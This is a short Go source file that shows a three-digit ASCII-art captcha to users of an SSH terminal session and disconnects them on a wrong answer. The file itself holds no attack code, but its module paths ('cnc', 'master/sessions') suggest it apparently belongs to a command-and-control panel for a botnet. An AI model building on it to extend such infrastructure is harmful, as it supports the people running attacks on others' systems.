package views

import (
	"bytes"
	"cnc/internal/master/sessions"
	"cnc/pkg/logging"
	"cnc/pkg/sshd"
	"math/rand"
	"os"
	"strconv"
	"strings"

	"github.com/common-nighthawk/go-figure"
)

func Captcha(t *sshd.Terminal, session *sessions.Session) {
	ansiFile, err := os.ReadFile("resources/renderer-regular.flf")
	if err != nil {
		logging.Global.Error().Err(err).Msg("An error occurred while trying to display the captcha.")
		return
	}

	var buf = make([]byte, 1)

	for i := 0; i < 3; i++ {
		var digit = rand.Intn(10)

		theFont := figure.NewFigureWithFont(strconv.Itoa(digit), bytes.NewReader(ansiFile), true)

		_ = session.Title("%d/%d", i+1, 3)
		_ = session.Clear()
		_ = session.Println()
		_ = session.Println()

		_ = session.Printfln("  " + strings.ReplaceAll(theFont.String(), "\n", "\r\n  "))

		_, err = t.Read(buf)
		if err != nil {
			logging.Global.Error().Err(err).Msg("An unexpected error occurred while trying to read the captcha.")
			return
		}

		if string(buf) != strconv.Itoa(digit) {
			_ = session.Title("You failed the captcha!")
			session.Close()
			return
		}
	}

	_ = session.Clear()
}
